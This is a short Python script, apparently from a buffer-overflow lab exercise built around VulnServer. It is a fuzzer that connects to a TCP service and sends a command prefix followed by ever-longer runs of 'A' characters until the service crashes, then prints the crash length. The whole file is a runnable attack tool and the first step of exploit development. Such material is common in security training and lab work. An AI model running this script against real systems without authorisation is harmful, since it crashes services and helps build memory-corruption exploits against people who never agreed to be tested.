#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.25.41" # Change me

port = 1337 # Change me
timeout = 5
prefix = "CULO " # Change this with the vulnerable parameter (Ex: TRUN, on VulnServer)

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Sending {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("The program has crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
